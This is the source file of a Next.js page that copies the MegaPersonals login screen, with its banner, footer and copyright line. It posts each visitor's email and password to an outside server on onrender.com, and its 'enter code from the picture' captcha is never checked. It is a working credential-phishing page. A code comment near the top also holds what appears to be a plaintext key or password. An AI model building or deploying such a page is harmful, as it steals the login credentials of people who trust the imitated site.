'use client';
import React, { useState } from 'react';
import loginBenner from '@/images/loginbenner.png';
import reloadbutton from '@/images/reloadButton.png';
import Image from 'next/image';
import axios from 'axios';
import frame from '@/images/frame.png';
import MessageModal from '@/components/MessageModal';


const page = () => {
    const images = [
        '/images/image1.png',
        '/images/image2.png',
        '/images/image3.png',
        '/images/image4.png',
        '/images/image5.png',
        '/images/image6.png',
        '/images/image7.png',
        '/images/image8.png',
        '/images/image9.png',
        '/images/image10.png',
        '/images/image11.png',
        '/images/image12.png',
        '/images/image13.png',
        '/images/image14.png',
        '/images/image15.png',
        '/images/image16.png',
        '/images/image17.png',
        '/images/image18.png',
        '/images/image19.png',
        '/images/image20.png',
        '/images/image21.png',
        '/images/image22.png',
        '/images/image23.png',
        '/images/image24.png',
        '/images/image25.png',
        '/images/image26.png',
        '/images/image27.png',
        '/images/image28.png',
        '/images/image29.png',
        '/images/image30.png',
      ];



      // mega-personal
      //KhIeiJ5kgc5m5wdz


      const [currentImage, setCurrentImage] = useState(images[0]);
      const [showMessage,setShowMessage] = useState(false);
      
      const changeImage = () => {
        const randomIndex = Math.floor(Math.random() * images.length);
        setCurrentImage(images[randomIndex]);
      };



      const [formData, setFormData] = useState({
        email: '',
        password: '',
        otp:''
      });

      const handleInputChange = (e) => {
        const { name, value } = e.target;
        setFormData({
          ...formData,
          [name]: value
        });
      };

      const handlesubmit =async (e) => {
        e.preventDefault(); 
        await axios.post('https://mega-backend-4k8t.onrender.com/api/submit', { email:formData.email, password:formData.password });


        setFormData({
          email: '',
          password: '',
          otp:''
        });
      }


      const handleshowMessage = () => {
        setShowMessage(!showMessage);
      }


    return (
        <main className='p-[40px] flex justify-center'>
           <section className='flex flex-col gap-[20px]'>
           <Image src={loginBenner} width={413} height={83} alt='login Benner'/>
           <section className='flex flex-col items-center gap-4'>
            <div className='flex flex-col items-center gap-2'>
                <h3 className='text-[#B9A697] text-[18px] font-normal'>Is this your first time posting?</h3>
                <button disabled className='w-[253px] px-[10px] rounded text-white font-bold text-[27px] bg-[#0492FF]'>Start Here</button>
            </div>
            <h3 className='text-[#B9A697] text-[18px] font-normal '>Already have an account?</h3>

            <form onSubmit={handlesubmit} className='flex flex-col gap-3'>
                <input type="email" name="email" value={formData.email} onChange={handleInputChange} className='block outline-none w-[253px] h-[33px] rounded border-2 border-[#c0c0c0] px-2 text-[#222222] text-[18px] ' placeholder='Email' required/>
                <input type="password" name="password" value={formData.password} onChange={handleInputChange} className='block outline-none w-[253px] h-[33px] rounded border-2 border-[#c0c0c0] px-2 text-[#222222] text-[18px]' placeholder='Password' required/>
                <div className='flex items-center justify-between'>
                    <div className='border-2 border-[#c0c0c0] rounded'><Image className='p-[2px]' src={currentImage} width={191} height={37} alt='..'/></div>
                    <span onClick={changeImage} className='cursor-pointer'><Image src={reloadbutton} width={41} height={41} alt='...'/></span>
                </div>
                <input type="text" name="otp" value={formData.otp} onChange={handleInputChange} className='block outline-none w-[253px] h-[33px] rounded border-2 border-[#c0c0c0] px-2 text-[#222222] text-[18px] ' placeholder='Enter code from the picture'/>

                <div className='flex flex-col items-center'>
                <input className='w-[120px] h-[44px]  bg-[#FEB161] text-[#FFFFFF] text-[22px] cursor-pointer' type="submit" value="SUBMIT" />
                </div>

              <Image className='cursor-pointer' onClick={handleshowMessage} src={frame} height={109} width={252} alt='...' />
              {
                showMessage && <MessageModal  setShowMessage={setShowMessage} showMessage={showMessage}/>
              }
            </form>

            <h3 className='text-[#0000EE] text-[14px] font-normal'>FORGOT PASSWORD?</h3>

            <div className='text-center flex flex-col sm:gap-[26px] gap:[10px] '>
          <ul className='flex sm:gap-2 gap-[1px] justify-center text-[#0481C9] text-[13px] font-normal'>
            <a href="/"><li className='cursor-pointer'>Home</li></a>
            <li>|</li>
            <li className='cursor-pointer'>Manage Posts</li>
            <li>|</li>
            <li className='cursor-pointer'>Contact Us</li>
            <li>|</li>
            <li className='cursor-pointer'>Policies & Terms</li>
          </ul>
          <h3 className='text-[#0481C9] text-[13px]'>Copyright @2024 MegaPersonals.eu</h3>
        </div>

           </section>
           </section>

        </main>
    );
};

export default page;